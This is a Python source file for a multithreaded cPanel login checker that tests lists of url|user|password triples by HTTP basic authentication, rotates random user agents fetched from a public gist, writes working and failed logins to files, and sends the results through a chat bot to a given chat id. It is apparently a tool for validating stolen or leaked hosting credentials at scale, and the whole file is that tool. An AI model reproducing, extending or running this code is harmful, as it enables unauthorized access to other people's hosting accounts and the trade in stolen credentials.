from email import message
from requests import get
from requests.auth import HTTPBasicAuth
from random import choice
from queue import Queue
from threading import Thread 
from multiprocessing import Lock,Pool

class CPanelBasicAuth:
    def __init__(self,site,message_id=False,bot=False):
        self.bot = bot
        self.site = site
        self.message_id = message_id
        user_agent = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
        self.headers = get(user_agent).text.splitlines()

    def checker(self,auth):
        url = auth[0]
        user = auth[1]
        password = auth[2]
        userAgent = choice(self.headers)
        headers = {"User-Agent":userAgent}
        resp = get(url,auth=HTTPBasicAuth(user,password),headers=headers)
        lock = Lock()
        lock.acquire()
        if resp.status_code == 200:self.sortingOut(auth,valide=True)
        else:self.sortingOut(auth,valide=False)
        lock.release()
    def queue_th_config(self,q):
        while not q.empty():
                i=q.get()
                self.checker(i)
                q.task_done()
    def multithreading(self):
        job = Queue()
        for i in self.site:
                job.put(i)
        for i in range(10):
                th=Thread(target=self.queue_th_config,args=(job,))
                th.daemon=True
                th.start()
                th.join()
        try:
                newfile = open(f"output/{self.message_id}[Cpanel].txt","rb")
                content = newfile.read()
                newfile.close()
                self.bot.send_document(self.message_id,content,caption="Working CPanels : ",visible_file_name="cpanels.txt")
                sec = True
        except:
                sec = False
        try:
                ntfile = open(f"output/{self.message_id}notworking[Cpanel].txt","rb")
                content = ntfile.read()
                ntfile.close()
                self.bot.send_document(self.message_id,content,caption="Not Working CPanels : ",visible_file_name="BadCpanels.txt")
                sec = True
        except:
                pass

        if sec is not True:
            self.bot.send_message(self.message_id,"Error Occured")

    def sortingOut(self,auth,valide=True):
        text = f"{auth[0]}|{auth[1]}|{auth[2]} \n"
        if valide:
            print(f"  Working - [{auth[0]}]")
            file = open(f"output/{self.message_id}[Cpanel].txt","a+")
            file.write(text)
            file.close()
        else:
            print(f"  Not Working - [{auth[0]}]")
            file = open(f"output/{self.message_id}notworking[Cpanel].txt", "a+")
            file.write(text)
            file.close()

    def sorter(self):
        organized_data=[]
        auth = []
        for i in self.site:
            url,user,password = i.split("|")
            auth.append(url)
            auth.append(user)
            auth.append(password)
            organized_data.append(auth)
            auth = []
        return organized_data